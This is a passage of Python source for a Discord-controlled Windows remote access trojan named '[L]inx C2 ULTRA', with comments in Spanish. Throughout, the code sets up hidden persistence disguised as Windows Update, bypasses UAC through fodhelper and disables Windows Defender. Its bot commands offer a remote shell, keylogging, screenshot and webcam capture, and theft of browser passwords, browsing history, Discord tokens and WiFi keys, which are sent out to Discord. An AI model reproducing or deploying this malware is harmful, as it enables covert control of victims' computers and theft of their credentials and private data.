            dest_dir = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate')
            os.makedirs(dest_dir, exist_ok=True)
            dest = os.path.join(dest_dir, f"{BOT_NAME}.exe")
            src = sys.executable
            if os.path.abspath(src).lower() != dest.lower():
                shutil.copy2(src, dest)
            return dest
        else:
            # Script .py: no se copia, se referencia con pythonw
            return _target_path()
    except Exception:
        return _target_path()

def _run_command():
    """Comando que lanza el bot de forma silenciosa."""
    target = _install_copy()
    if getattr(sys, 'frozen', False):
        return f'"{target}"'
    # Script: buscar pythonw.exe
    pythonw = None
    for p in [sys.executable.replace('python.exe', 'pythonw.exe'), r'C:\Windows\pyw.exe', r'C:\Python311\pythonw.exe']:
        if os.path.exists(p):
            pythonw = p
            break
    if not pythonw:
        pythonw = sys.executable
    return f'"{pythonw}" "{target}"'

def install_persistence():
    ok = False

    # 1) HKCU Run
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_HKCU, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, BOT_NAME, 0, winreg.REG_SZ, _run_command())
        winreg.CloseKey(key)
        ok = True
    except Exception:
        pass

    # 2) HKLM Run (solo admin)
    if is_admin():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, RUN_KEY_HKLM, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, BOT_NAME, 0, winreg.REG_SZ, _run_command())
            winreg.CloseKey(key)
            ok = True
        except Exception:
            pass

    # 3) Startup folder con .vbs (oculto, sin ventana)
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup):
            vbs = os.path.join(startup, STARTUP_NAME)
            with open(vbs, 'w') as f:
                f.write(f'Set obj = CreateObject("WScript.Shell")\n'
                        f'obj.Run "{_run_command()}", 0, False\n')
            # Ocultar el archivo
            try:
                ctypes.windll.kernel32.SetFileAttributesW(vbs, 2)
            except Exception:
                pass
            ok = True
    except Exception:
        pass

    # 4) Tarea programada (solo admin)
    if is_admin():
        try:
            subprocess.run(
                f'schtasks /create /tn "{SCHED_TASK}" /tr "{_run_command()}" /sc onlogon /ru SYSTEM /f',
                shell=True, capture_output=True, timeout=15
            )
            ok = True
        except Exception:
            pass

    # 5) Servicio (solo admin)
    if is_admin():
        try:
            subprocess.run(
                f'sc create "{SVC_NAME}" binPath= "{_run_command()}" start= auto',
                shell=True, capture_output=True, timeout=15
            )
            ok = True
        except Exception:
            pass

    return ok

def remove_persistence():
    try:
        for hive, run_key in [(winreg.HKEY_CURRENT_USER, RUN_KEY_HKCU), (winreg.HKEY_LOCAL_MACHINE, RUN_KEY_HKLM)]:
            try:
                key = winreg.OpenKey(hive, run_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, BOT_NAME)
                winreg.CloseKey(key)
            except Exception:
                pass
    except Exception:
        pass

    try:
        subprocess.run(f'schtasks /delete /tn "{SCHED_TASK}" /f', shell=True, capture_output=True, timeout=15)
    except Exception:
        pass
    try:
        subprocess.run(f'sc delete "{SVC_NAME}"', shell=True, capture_output=True, timeout=15)
    except Exception:
        pass
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        vbs = os.path.join(startup, STARTUP_NAME)
        if os.path.exists(vbs):
            os.remove(vbs)
    except Exception:
        pass
    return True

def persistence_status():
    status = []
    # HKCU Run
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_HKCU)
        winreg.QueryValueEx(key, BOT_NAME)
        status.append("HKCU Run: ✅")
    except Exception:
        status.append("HKCU Run: ❌")
    # HKLM Run
    if is_admin():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, RUN_KEY_HKLM)
            winreg.QueryValueEx(key, BOT_NAME)
            status.append("HKLM Run: ✅")
        except Exception:
            status.append("HKLM Run: ❌")
    # Tarea
    code, out = run_cmd('schtasks /query /tn "WindowsUpdateService" /fo list', timeout=10)
    status.append(f"Tarea: {'✅' if code == 0 else '❌'}")
    # Startup vbs
    startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    status.append(f"Startup VBS: {'✅' if os.path.exists(os.path.join(startup, STARTUP_NAME)) else '❌'}")
    return "\n".join(status)

# ──────────────────────────────────────────────────────────────
# UAC BYPASS (deprecated no funciona en Windows 11)
# ──────────────────────────────────────────────────────────────

def uac_bypass():
    try:
        script_path = _target_path()
        reg_key = r"Software\Classes\ms-settings\Shell\Open\command"

        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{script_path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

        subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"],
                         startupinfo=hide_console_window(),
                         creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))

        # Restaurar registro a los 4s para no romper ms-settings
        def restore():
            time.sleep(4)
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_key)
            except Exception:
                pass
        threading.Thread(target=restore, daemon=True).start()
        return True
    except Exception:
        return False

# ──────────────────────────────────────────────────────────────
# DESHABILITAR DEFENDER
# ──────────────────────────────────────────────────────────────

def disable_defender():
    if not is_admin():
        return False
    ok = False
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Policies\Microsoft\Windows Defender")
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        ok = True
    except Exception:
        pass

    powershell = (
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Set-MpPreference -DisableBehaviorMonitoring $true; "
        "Set-MpPreference -DisableBlockAtFirstSeen $true; "
        "Set-MpPreference -DisableIOAVProtection $true; "
        "Set-MpPreference -SubmitSamplesConsent 2; "
        "Set-MpPreference -MAPSReporting 0; "
        "Set-MpPreference -DisableScriptScanning $true; "
        "Set-MpPreference -DisableTamperProtection $true"
    )
    try:
        subprocess.run(['powershell', '-Command', powershell],
                       capture_output=True, timeout=30,
                       startupinfo=hide_console_window(),
                       creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
        ok = True
    except Exception:
        pass
    return ok

# ──────────────────────────────────────────────────────────────
# FAKE BSOD (mejorado: ventanas guardadas, stop codes aleatorios)
# ──────────────────────────────────────────────────────────────

STOP_CODES = [
    "CRITICAL_PROCESS_DIED", "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
    "IRQL_NOT_LESS_OR_EQUAL", "PAGE_FAULT_IN_NONPAGED_AREA",
    "SYSTEM_SERVICE_EXCEPTION", "KERNEL_DATA_INPAGE_ERROR",
    "VIDEO_TDR_FAILURE", "MEMORY_MANAGEMENT",
]

_bsod_windows = []

def generate_qr_code(data):
    if not HAS_QR:
        return None
    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=5, border=2)
    qr.add_data(data)
    qr.make(fit=True)
    return qr.make_image(fill='black', back_color='white')

def _create_bsod_window(monitor, qr_image, stop_code, percent):
    root = tk.Tk()
    root.title("Blue Screen of Death")
    root.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
    root.configure(bg='#0078D7')
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)

    frame = tk.Frame(root, bg='#0078D7')
    frame.pack(expand=True, fill='both')

    left = tk.Frame(frame, bg='#0078D7')
    left.pack(side='left', anchor='w', padx=50, pady=50)

    tk.Label(left, text=':(', font=('Segoe UI', 120), fg='white', bg='#0078D7').pack(anchor='w')
    tk.Label(left,
             text="Your PC ran into a problem and needs to restart.\n"
                  "We're just collecting some error info, and then we'll restart for you.",
             font=('Segoe UI', 18), fg='white', bg='#0078D7', justify='left').pack(anchor='w')
    tk.Label(left, text=f"{percent}% complete", font=('Segoe UI', 18), fg='white', bg='#0078D7').pack(anchor='w')

    bottom = tk.Frame(left, bg='#0078D7')
    bottom.pack(anchor='w', pady=20)

    if qr_image:
        try:
            from PIL import ImageTk
            qr_tk = ImageTk.PhotoImage(qr_image)
            lbl = tk.Label(bottom, image=qr_tk, bg='#0078D7')
            lbl.image = qr_tk
            lbl.pack(side='left', padx=(0, 20))
        except Exception:
            pass

    tk.Label(bottom,
             text="For more information about this issue and possible fixes, visit https://www.windows.com/stopcode\n\n"
                  "If you call a support person, give them this info:\n"
                  f"Stop code: {stop_code}",
             font=('Segoe UI', 14), fg='white', bg='#0078D7', justify='left').pack(side='left')

    return root

def show_fake_bsod():
    global _bsod_windows
    if not HAS_TK:
        return False
    try:
        from screeninfo import get_monitors
        monitors = get_monitors()
        youtube_url = "https://www.youtube.com/watch?v=R0lqowYD_Tg"
        stop_code = random.choice(STOP_CODES)
        percent = random.randint(10, 90)
        qr_image = generate_qr_code(youtube_url)
        for mon in monitors:
            root = _create_bsod_window(mon, qr_image, stop_code, percent)
            _bsod_windows.append(root)
        return True
    except Exception:
        return False

# ──────────────────────────────────────────────────────────────
# BACKGROUND TASKS
# ──────────────────────────────────────────────────────────────

_background_tasks = {}
_bg_lock = threading.Lock()
_bg_counter = 0

def start_background_task(command):
    global _bg_counter
    with _bg_lock:
        _bg_counter += 1
        tid = _bg_counter

    result = {"done": False, "output": "", "returncode": None}

    def worker():
        code, out = run_cmd(command, timeout=600)
        result["done"] = True
        result["output"] = out
        result["returncode"] = code

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    _background_tasks[tid] = result
    return tid

# ──────────────────────────────────────────────────────────────
# BOT DISCORD
# ──────────────────────────────────────────────────────────────

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# Shell: canal -> activo
shell_sessions = {}

def owner_check(ctx):
    if OWNER_ID == 0:
        return True
    return ctx.author.id == OWNER_ID

async def check_access(ctx):
    if not owner_check(ctx):
        await ctx.send("❌ No autorizado.")
        return False
    return True

# ─── COMANDOS: INFO ───

@bot.command(name='help', aliases=['cmds', 'comandos', 'menu'])
async def cmd_help(ctx):
    if not await check_access(ctx):
        return
    text = f"""**[L]inx C2 ULTRA v3.0** — host: `{socket.gethostname()}` (`{get_local_ip()}`)

**SHELL**
`{PREFIX}shell` — activa shell en este canal
`{PREFIX}exitshell` — desactiva la shell de este canal
`{PREFIX}exec <cmd>` — ejecuta un comando y devuelve salida
`{PREFIX}bg <cmd>` — ejecuta en background, devuelve ID
`{PREFIX}bgoutput <id>` — recupera salida de tarea bg
`{PREFIX}bglist` — lista tareas en background

**INFORMACIÓN**
`{PREFIX}sysinfo` `{PREFIX}ip` `{PREFIX}geo` `{PREFIX}status` `{PREFIX}uptime`
`{PREFIX}tasklist` `{PREFIX}netstat` `{PREFIX}admincheck`

**CAPTURA**
`{PREFIX}screenshot` `{PREFIX}screenshotall` `{PREFIX}webcam` `{PREFIX}paperclip`
`{PREFIX}keylog <seg>` — captura N segundos
`{PREFIX}keylogstart` / `{PREFIX}keylogstop` — keylogger continuo

**STOLEN DATA**
`{PREFIX}passwords` `{PREFIX}history` `{PREFIX}token` `{PREFIX}wifi`

**ARCHIVOS**
`{PREFIX}ls <ruta>` `{PREFIX}cd <ruta>` `{PREFIX}pwd`
`{PREFIX}rm <ruta>` `{PREFIX}mkdir <dir>`
`{PREFIX}download <url> [ruta]` — URL -> host
`{PREFIX}sendfile <ruta>` — host -> Discord
`{PREFIX}getfile` — Discord -> host (adjunta un archivo)

**PRIVILEGIOS**
`{PREFIX}uacbypass` `{PREFIX}elevate` `{PREFIX}disableantivirus`

**PERSISTENCIA**
`{PREFIX}persistence` `{PREFIX}unpersistence` `{PREFIX}persistcheck`

**DIVERSIÓN**
`{PREFIX}fakebluescreen` `{PREFIX}bluescreen` `{PREFIX}windowspassword`

**PYTHON**
`{PREFIX}py <codigo>` — ejecuta Python en el host

**CONTROL**
`{PREFIX}shutdown` — apaga el bot
`{PREFIX}exit` — cierra todo
"""
    await send_paginated(ctx.channel, text, wrap="", lang="")

@bot.command(name='shell')
async def cmd_shell(ctx):
    if not await check_access(ctx):
        return
    shell_sessions[ctx.channel.id] = True
    await ctx.send("✅ **Shell activada en este canal.**\nEscribe comandos directamente (sin prefijo). `!exitshell` para salir.")

@bot.command(name='exitshell')
async def cmd_exitshell(ctx):
    if not await check_access(ctx):
        return
    shell_sessions.pop(ctx.channel.id, None)
    await ctx.send("✅ Shell desactivada.")

@bot.command(name='exec', aliases=['run', 'cmd', 'sh'])
async def cmd_exec(ctx, *, command: str):
    if not await check_access(ctx):
        return
    if not command.strip():
        await ctx.send("❌ Uso: !exec <comando>")
        return
    await ctx.send("⚙️ Ejecutando...")
    code, output = run_cmd(command)
    header = f"`exit: {code}`\n" if code != 0 else ""
    await send_paginated(ctx.channel, header + output)
    if not output:
        await ctx.send("(sin salida)")

@bot.command(name='bg', aliases=['background'])
async def cmd_bg(ctx, *, command: str):
    if not await check_access(ctx):
        return
    tid = start_background_task(command)
    await ctx.send(f"⏳ Tarea `#{tid}` lanzada. Usa `!bgoutput {tid}` para ver el resultado.")

@bot.command(name='bgoutput', aliases=['bgo'])
async def cmd_bgoutput(ctx, tid: int):
    if not await check_access(ctx):
        return
    if tid not in _background_tasks:
        await ctx.send("❌ Tarea no encontrada.")
        return
    res = _background_tasks[tid]
    if not res["done"]:
        await ctx.send(f"⏳ Tarea `#{tid}` todavía en ejecución...")
        return
    await send_paginated(ctx.channel, f"**BG #{tid}** (exit {res['returncode']})\n{res['output']}")
    _background_tasks.pop(tid, None)

@bot.command(name='bglist')
async def cmd_bglist(ctx):
    if not await check_access(ctx):
        return
    if not _background_tasks:
        await ctx.send("No hay tareas en background.")
        return
    lines = []
    for tid, res in _background_tasks.items():
        state = "🟢 ejecutando" if not res["done"] else "⚫ terminada"
        lines.append(f"`#{tid}` — {state}")
    await ctx.send("\n".join(lines))

@bot.command(name='sysinfo', aliases=['systeminfo', 'info'])
async def cmd_sysinfo(ctx):
    if not await check_access(ctx):
        return
    info = get_system_info()
    if "error" in info:
        await ctx.send(f"❌ Error: {info['error']}")
        return
    await ctx.send(
        f"**Hostname:** {info['hostname']}\n"
        f"**User:** {info['user']}\n"
        f"**IP:** {info['ip']}\n"
        f"**OS:** {info['os']}\n"
        f"**Arch:** {info['arch']}\n"
        f"**CPU:** {info['cpu']} ({info['cpu_percent']}%)\n"
        f"**RAM:** {info['ram_total']} GB total, {info['ram_free']} GB libre ({info['ram_percent']}%)\n"
        f"**Disk C:** {info['disk_total']} GB total, {info['disk_free']} GB libre\n"
        f"**Admin:** {'✅' if info['admin'] else '❌'}\n"
        f"**PID:** {info['pid']}\n"
        f"**Python:** {info['python']}"
    )

@bot.command(name='ip')
async def cmd_ip(ctx):
    if not await check_access(ctx):
        return
    pub = get_public_ip() or "desconocida"
    local = get_local_ip()
    await ctx.send(f"🌐 **IP pública:** `{pub}`\n📡 **IP local:** `{local}`")

@bot.command(name='geo')
async def cmd_geo(ctx):
    if not await check_access(ctx):
        return
    data = get_geo()
    if not data:
        await ctx.send("❌ No se pudo obtener geolocalización.")
        return
    await ctx.send(
        f"📍 **Geo:** {data.get('city', '?')}, {data.get('regionName', '?')}, {data.get('country', '?')}\n"
        f"**ISP:** {data.get('isp', '?')}\n"
        f"**Org:** {data.get('org', '?')}\n"
        f"**AS:** {data.get('as', '?')}\n"
        f"**Zona:** {data.get('timezone', '?')}\n"
        f"**Lat/Lon:** {data.get('lat', '?')}, {data.get('lon', '?')}"
    )

@bot.command(name='status')
async def cmd_status(ctx):
    if not await check_access(ctx):
        return
    sessions = len(shell_sessions)
    bg = len([t for t in _background_tasks.values() if not t['done']])
    await ctx.send(
        f"**Bot:** {bot.user}\n"
        f"**Host:** {socket.gethostname()}\n"
        f"**PID:** {os.getpid()}\n"
        f"**Uptime bot:** {datetime.timedelta(seconds=int(time.time() - _start_time))}\n"
        f"**Shells activas:** {sessions}\n"
        f"**BG tasks corriendo:** {bg}\n"
        f"**Latencia:** {round(bot.latency * 1000, 1)} ms"
    )

@bot.command(name='uptime')
async def cmd_uptime(ctx):
    if not await check_access(ctx):
        return
    if HAS_PSUTIL:
        try:
            boot = datetime.datetime.fromtimestamp(psutil.boot_time())
            up = datetime.datetime.now() - boot
            await ctx.send(f"🕐 **Uptime del sistema:** {up.days} días, {up.seconds // 3600} h, {(up.seconds // 60) % 60} min")
            return
        except Exception:
            pass
    code, out = run_cmd("net stats workstation", timeout=10)
    await send_paginated(ctx.channel, out)

@bot.command(name='tasklist', aliases=['ps', 'procs'])
async def cmd_tasklist(ctx):
    if not await check_access(ctx):
        return
    if HAS_PSUTIL:
        lines = ["```"]
        for proc in sorted(psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']),
                           key=lambda p: (p.info.get('memory_info') or type('', (), {'rss': 0})().rss if p.info.get('memory_info') else 0) or 0,
                           reverse=True)[:40]:
            try:
                mem = proc.info['memory_info'].rss // (1024**2) if proc.info.get('memory_info') else 0
                lines.append(f"{proc.info['pid']:>6}  {mem:>5} MB  {proc.info['name']}")
            except Exception:
                continue
        lines.append("```")
        await send_paginated(ctx.channel, "\n".join(lines))
    else:
        code, out = run_cmd("tasklist", timeout=15)
        await send_paginated(ctx.channel, out)

@bot.command(name='taskkill', aliases=['kill', 'pkill'])
async def cmd_taskkill(ctx, pid: int):
    if not await check_access(ctx):
        return
    try:
        proc = psutil.Process(pid)
        name = proc.name()
        proc.kill()
        await ctx.send(f"💀 Proceso `{name}` (PID {pid}) terminado.")
    except Exception as e:
        code, out = run_cmd(f"taskkill /F /PID {pid}", timeout=10)
        if code == 0:
            await ctx.send(f"💀 PID {pid} terminado.")
        else:
            await ctx.send(f"❌ No se pudo terminar: {out[-500:]}")

@bot.command(name='netstat')
async def cmd_netstat(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🌐 Recopilando conexiones...")
    code, out = run_cmd("netstat -ano", timeout=20)
    lines = []
    for line in out.splitlines():
        if "ESTABLISHED" in line or "LISTENING" in line:
            lines.append(line.strip())
    if not lines:
        lines = ["(sin conexiones activas)"]
    await send_paginated(ctx.channel, "\n".join(lines[:100]))

# ─── CAPTURA ───

@bot.command(name='screenshot')
async def cmd_screenshot(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("📸 Capturando...")
    path = take_screenshot(all_screens=False)
    if path and os.path.exists(path):
        await ctx.send(file=discord.File(path))
        try:
            os.remove(path)
        except Exception:
            pass
    else:
        await ctx.send("❌ Error al tomar screenshot (¿sin pantalla? ¿pyautogui instalado?)")

@bot.command(name='screenshotall', aliases=['ssall'])
async def cmd_screenshotall(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("📸 Capturando todos los monitores...")
    path = take_screenshot(all_screens=True)
    if path and os.path.exists(path):
        await ctx.send(file=discord.File(path))
        try:
            os.remove(path)
        except Exception:
            pass
    else:
        await ctx.send("❌ Error al capturar multi-monitor")

@bot.command(name='webcam', aliases=['cam'])
async def cmd_webcam(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🎥 Capturando webcam...")
    path = capture_webcam()
    if path and os.path.exists(path):
        await ctx.send(file=discord.File(path))
        try:
            os.remove(path)
        except Exception:
            pass
    else:
        await ctx.send("❌ No se pudo capturar webcam (¿cv2 instalado? ¿cámara conectada?)")

@bot.command(name='paperclip', aliases=['clipboard', 'clip'])
async def cmd_paperclip(ctx):
    if not await check_access(ctx):
        return
    text = get_clipboard()
    await send_paginated(ctx.channel, text)

@bot.command(name='keylog', aliases=['keylogger'])
async def cmd_keylog(ctx, seconds: int = 30):
    if not await check_access(ctx):
        return
    seconds = max(1, min(seconds, 300))
    await ctx.send(f"⌨️ Capturando teclado durante {seconds}s...")
    path = capture_keylog_timed(seconds)
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        if not content.strip():
            content = "(nada capturado)"
        await send_paginated(ctx.channel, content)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")
    finally:
        try:
            os.remove(path)
        except Exception:
            pass

@bot.command(name='keylogstart')
async def cmd_keylogstart(ctx):
    if not await check_access(ctx):
        return
    path, already = start_keylogger()
    state = "ya estaba activo" if already else "iniciado"
    await ctx.send(f"⌨️ Keylogger {state}. Archivo: `{path}`")

@bot.command(name='keylogstop')
async def cmd_keylogstop(ctx):
    if not await check_access(ctx):
        return
    path, was_running = stop_keylogger()
    if not was_running:
        await ctx.send("El keylogger no estaba activo.")
        return
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        await send_paginated(ctx.channel, content or "(vacío)")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# ─── STOLEN DATA ───

@bot.command(name='passwords', aliases=['pw', 'creds'])
async def cmd_passwords(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🔍 Extrayendo contraseñas... (puede tardar)")
    try:
        creds = await asyncio.get_event_loop().run_in_executor(None, extract_browser_creds)
        if not creds:
            # Diagnóstico: mostrar qué navegadores se detectaron y qué falló
            if LOGIN_DIAGNOSTICS:
                lines = ["⚠️ No se descifró nada. Diagnóstico:"]
                for k, v in list(LOGIN_DIAGNOSTICS.items())[:15]:
                    lines.append(f"`{k}` → `{v}`")
                await ctx.send("\n".join(lines))
                return
            await ctx.send("No se encontraron navegadores instalados con credenciales.")
            return

        lines = []
        total = sum(len(v) for v in creds.values())
        lines.append(f"**Total: {total} credenciales**")

        # Crear archivo completo
        dump_path = os.path.join(tempfile.gettempdir(), f"creds_{int(time.time())}.txt")
        with open(dump_path, 'w', encoding='utf-8') as f:
            for browser, entries in creds.items():
                f.write(f"\n===== {browser} =====\n")
                for e in entries:
                    f.write(f"{e['site']} | {e['username']} | {e['password']}\n")

        # Resumen en chat + archivo completo
        for browser, entries in creds.items():
            lines.append(f"**{browser}**: {len(entries)} credenciales")
            for e in entries[:3]:
                lines.append(f"`{e['site'][:50]}` | `{e['username'][:20]}` | `{e['password'][:30]}`")
            lines.append("...")

        await ctx.send("\n".join(lines[:50]))
        if os.path.exists(dump_path):
            await ctx.send(file=discord.File(dump_path))
            os.remove(dump_path)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='history')
async def cmd_history(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🔍 Extrayendo historial...")
    try:
        history = await asyncio.get_event_loop().run_in_executor(None, extract_browser_history)
        if not history:
            await ctx.send("No se encontró historial.")
            return
        temp_file = os.path.join(tempfile.gettempdir(), f"history_{int(time.time())}.txt")
        with open(temp_file, 'w', encoding='utf-8') as f:
            for browser, urls in history.items():
                f.write(f"\n===== {browser} =====\n")
                for url, title in urls[:500]:
                    f.write(url)
                    if title:
                        f.write(f"  [{title[:80]}]")
                    f.write("\n")
        await ctx.send(file=discord.File(temp_file))
        os.remove(temp_file)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='token', aliases=['tokens', 'discordtokens'])
async def cmd_token(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🔍 Extrayendo tokens de Discord...")
    try:
        tokens = await asyncio.get_event_loop().run_in_executor(None, extract_discord_tokens)
        if not tokens:
            await ctx.send("No se encontraron tokens.")
            return
        lines = [f"**{len(tokens)} tokens encontrados:**"]
        for t in tokens[:15]:
            lines.append(f"**{t['app']}**\n`{t['token']}`")
        await ctx.send("\n".join(lines))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='wifi', aliases=['wifipass'])
async def cmd_wifi(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("📶 Extrayendo redes WiFi guardadas...")
    wifis = await asyncio.get_event_loop().run_in_executor(None, get_wifi_passwords)
    if not wifis:
        await ctx.send("No se encontraron redes WiFi guardadas.")
        return
    lines = [f"**{len(wifis)} redes:**"]
    for w in wifis:
        lines.append(f"`{w['ssid']}` : `{w['password']}`")
    await send_paginated(ctx.channel, "\n".join(lines))

# ─── ARCHIVOS ───

@bot.command(name='ls', aliases=['dir', 'list'])
async def cmd_ls(ctx, path: str = '.'):
    if not await check_access(ctx):
        return
    try:
        entries = os.listdir(path)
    except Exception as e:
        await ctx.send(f"❌ {e}")
        return
    lines = [f"**{os.path.abspath(path)}** — {len(entries)} elementos\n"]
    for entry in sorted(entries):
        full = os.path.join(path, entry)
        try:
            if os.path.isdir(full):
                lines.append(f"📁 `{entry}`/")
            else:
                size = os.path.getsize(full)
                if size >= 1024**3:
                    size_s = f"{size/1024**3:.1f} GB"
                elif size >= 1024**2:
                    size_s = f"{size/1024**2:.1f} MB"
                elif size >= 1024:
                    size_s = f"{size/1024:.1f} KB"
                else:
                    size_s = f"{size} B"
                lines.append(f"📄 `{entry}` ({size_s})")
        except Exception:
            lines.append(f"📄 `{entry}`")
    await send_paginated(ctx.channel, "\n".join(lines))

@bot.command(name='cd')
async def cmd_cd(ctx, path: str):
    if not await check_access(ctx):
        return
    try:
        if not os.path.isdir(path):
            await ctx.send(f"❌ No es un directorio: {path}")
            return
        os.chdir(path)
        await ctx.send(f"📂 Directorio: `{os.getcwd()}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name='pwd', aliases=['cwd'])
async def cmd_pwd(ctx):
    if not await check_access(ctx):
        return
    await ctx.send(f"📂 `{os.getcwd()}`")

@bot.command(name='rm', aliases=['delete', 'del'])
async def cmd_rm(ctx, path: str):
    if not await check_access(ctx):
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        elif os.path.exists(path):
            os.remove(path)
        else:
            await ctx.send(f"❌ No existe: {path}")
            return
        await ctx.send(f"🗑️ Eliminado: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name='mkdir', aliases=['makedir'])
async def cmd_mkdir(ctx, path: str):
    if not await check_access(ctx):
        return
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"✅ Creado: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name='download', aliases=['dl'])
async def cmd_download(ctx, url: str, path: str = None):
    """Descarga un archivo de una URL al host."""
    if not await check_access(ctx):
        return
    if not path:
        path = os.path.join(os.getcwd(), url.split('/')[-1] or 'downloaded.bin')
    await ctx.send(f"⬇️ Descargando `{url}` -> `{path}`")
    try:
        if HAS_REQUESTS:
            r = requests.get(url, timeout=30, stream=True)
            r.raise_for_status()
            with open(path, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            await ctx.send(f"✅ Guardado: `{path}` ({os.path.getsize(path)} bytes)")
        else:
            code, out = run_cmd(f'powershell -Command "Invoke-WebRequest -Uri \'{url}\' -OutFile \'{path}\'"', timeout=120)
            if os.path.exists(path):
                await ctx.send(f"✅ Guardado: `{path}` ({os.path.getsize(path)} bytes)")
            else:
                await ctx.send(f"❌ Falló: {out[-500:]}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name='sendfile', aliases=['send'])
async def cmd_sendfile(ctx, path: str):
    if not await check_access(ctx):
        return
    if not os.path.exists(path):
        await ctx.send(f"❌ No existe: {path}")
        return
    try:
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"❌ Error enviando: {e}")

@bot.command(name='getfile', aliases=['upload', 'recv'])
async def cmd_getfile(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("📤 Envía el archivo como adjunto (60s timeout)")

    def check(m):
        return m.author == ctx.author and m.attachments

    try:
        msg = await bot.wait_for('message', check=check, timeout=60)
        attachment = msg.attachments[0]
        path = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(path)
        await ctx.send(f"✅ Guardado: `{path}` ({os.path.getsize(path)} bytes)")
    except asyncio.TimeoutError:
        await ctx.send("⏰ Tiempo agotado.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

# ─── PRIVILEGIOS ───

@bot.command(name='admincheck')
async def cmd_admincheck(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("✅ Admin" if is_admin() else "❌ No admin")

@bot.command(name='uacbypass')
async def cmd_uacbypass(ctx):
    if not await check_access(ctx):
        return
    if is_admin():
        await ctx.send("✅ Ya soy admin.")
        return
    if uac_bypass():
        await ctx.send("✅ Bypass UAC lanzado. El proceso se re-lanza elevado.")
    else:
        await ctx.send("❌ Falló el bypass.")

@bot.command(name='elevate', aliases=['runas', 'getadmin'])
async def cmd_elevate(ctx):
    if not await check_access(ctx):
        return
    if is_admin():
        await ctx.send("✅ Ya soy admin.")
        return
    try:
        target = _target_path()
        ps = (f'Start-Process -FilePath "{target}" -Verb RunAs -WindowStyle Hidden')
        subprocess.Popen(['powershell', '-Command', ps],
                         startupinfo=hide_console_window(),
                         creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
        await ctx.send("✅ Elevando... si aparece UAC en el host, acepta.")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command(name='disableantivirus', aliases=['killdefender', 'nodef'])
async def cmd_disableantivirus(ctx):
    if not await check_access(ctx):
        return
    if not is_admin():
        await ctx.send("❌ Se requiere admin. Usa `!uacbypass` o `!elevate` primero.")
        return
    await ctx.send("🛡️ Deshabilitando Defender...")
    if disable_defender():
        await ctx.send("✅ Defender mayormente deshabilitado.")
    else:
        await ctx.send("❌ Falló.")

# ─── PERSISTENCIA ───

@bot.command(name='persistence', aliases=['persist'])
async def cmd_persistence(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("⏳ Instalando persistencia...")
    if install_persistence():
        await ctx.send("✅ Persistencia instalada (multi-método). `!persistcheck` para verificar.")
    else:
        await ctx.send("❌ Falló la instalación.")

@bot.command(name='unpersistence', aliases=['unpersist', 'cleanup'])
async def cmd_unpersistence(ctx):
